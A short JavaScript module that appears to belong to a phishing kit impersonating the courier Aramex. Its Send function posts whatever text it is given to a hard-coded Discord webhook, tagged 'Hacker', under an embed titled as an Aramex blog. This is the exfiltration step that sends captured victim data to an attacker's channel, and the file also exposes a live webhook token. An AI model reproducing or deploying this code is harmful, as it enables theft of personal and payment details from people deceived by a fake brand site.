import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1324126904600494121/k0ZESX2uUkhdGmW0fsZrBe4AuGpu-HR-8evcMQe_M8Z_KJz6YDJ_bW4JnReiknfzmpC2",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
